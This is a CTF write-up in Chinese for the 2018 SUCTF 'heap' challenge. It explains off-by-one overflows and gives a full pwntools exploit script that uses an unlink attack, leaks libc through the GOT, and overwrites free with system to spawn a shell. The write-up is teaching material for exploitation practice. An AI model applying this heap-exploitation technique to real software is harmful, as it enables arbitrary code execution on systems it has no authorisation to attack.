---
title: '2018-SUCTF-Heap-[off by one,unlink]'
date: 2019-03-24 21:28:26
tags: [off by one,unlink,x64]
---

### 0x00 off by one
off by one 是指一种单字节的缓冲区溢出，即程序向缓冲区中写入数据时，写入的字节数超过了缓冲区的大小，并且只溢出了一个字节，这种漏洞一般与边界验证不严谨和字符串操作不严谨有关。其中字符串操作不严谨包括
1.  使用循环语句向堆写入数据时出现问题。比如循环次数设置错误，或者向有效数据区外多写一个字节数据
2.  字符串操作不当，比如strcpy函数
针对第一种情况，比如2016-BCTF-bcloud这题，程序自己定义了一个用for实现的写入函数：
```C
int __cdecl sub_804868D(int a1, int a2, char a3)
{
  char buf; // [esp+1Bh] [ebp-Dh]
  int i; // [esp+1Ch] [ebp-Ch]

  for ( i = 0; i < a2; ++i )
  {
    if ( read(0, &buf, 1u) <= 0 )
      exit(-1);
    if ( buf == a3 )
      break;
    *(_BYTE *)(a1 + i) = buf;
  }
  *(_BYTE *)(i + a1) = 0;   //* off by one
  return i;
}
```
但是在循环外多赋值了一次，在本该写入数据的数据区外多赋值了一个\x00，这个\x00是为了加入字符串截断符，但是应该也要为这个截断符多申请一个字节的空间，造成了在有效数据区外写入一个数据，而多写的一个字节的数据刚好被是堆指针覆盖，造成可以泄露堆指针，修改topchunk的SIZE。

这个题是字符串操作不当造成的off by one

### 0x01 程序分析
```
Canary                        : No
NX                            : Yes
PIE                           : No
Fortify                       : No
RelRO                         : Partial
```
```
./heap
1:creat
2:delet
3:show
4:edit
```
程序向堆中写入数据时，没有加入字符串截断符\x00，导致使用strcpy函数时，从缓冲区拷贝了多余预期的数据到堆内存中，导致当前堆数据长度为本身堆数据长度加上下一个堆的prev_size+SIZE的一个字节。
```c
    s_data = malloc(nbytes);
    s = malloc(nbytes);
    memset(s, 0, nbytes);
    memset(s_data, 0, nbytes);
    puts("input your data");
    read(0, s_data, (unsigned int)nbytes);
    strcpy((char *)s, (const char *)s_data);
```
而程序的edit函数是根据堆长度修改堆数据，所以可以修改nextchunk的SIZE的p标志位，就可以触发freechunk的合并，适当构造chunk内容，就可以利用unlink获得可控指针，进而实现任意地址的读写。
### 0x02 EXP
```python
#!/usr/bin/env python
from pwn import *
p = process('./heap')
elf = ELF('./heap')
libc = ELF('./libc')

DEBUG = 0
VERBOSE = 0
if DEBUG:
	gdb.attach(p)
if VERBOSE:
	context(log_level = 'debug')

def creat(lenth,content):
	p.recvuntil('4:edit')
	p.sendline('1')
	p.recvuntil('len')
	p.sendline(str(lenth))
	p.recvuntil('data')
	p.send(content)

def delete(idx):
	p.recvuntil('4:edit')
	p.sendline('2')
	p.recvuntil('id')
	p.sendline(str(idx))

def show(idx):
	p.recvuntil('4:edit')
	p.sendline('3')
	p.recvuntil('id')
	p.sendline(str(idx))

def edit(idx,content):
	p.recvuntil('4:edit')
	p.sendline('4')
	p.recvuntil('id')
	p.sendline(str(idx))
	p.recvuntil('data')
	p.send(content)


def pwn():
	heap_form3 = 0x6020d8
	creat(0x80,'bbbbbbbb')	#0  0x6020c0
	creat(0x80,'/bin/sh;')	#1	0x6020c8
	creat(0x80,'bbbbbbbb')	#2	0x6020d0
	creat(0x88,'a'*0x98)	  #3	0x6020d8
	creat(0x80,'bbbbbbbb')	#4	0x6020e0
	payload = p64(0)+p64(0)
	payload += p64(heap_form3-0x18)+p64(heap_form3-0x10)
	payload = payload.ljust(0x80,'a')
	payload += p64(0x80)
	payload += '\x90'
	edit(3,payload)
	delete(4)

	payload = p64(elf.got['free'])
	edit(3,payload)
	show(0)
	free_addr = p.recvuntil('1:creat')[1:-7].ljust(8,'\x00')
	free_addr = u64(free_addr)
	libc_base = free_addr - libc.symbols['free']
	log.success('libc_base: '+hex(libc_base))
	system_addr = libc_base + libc.symbols['system']
	log.success('system_addr: '+hex(system_addr))
	edit(0,p64(system_addr))
	delete(1)
	p.interactive()

if __name__ == '__main__':
	pwn()
```
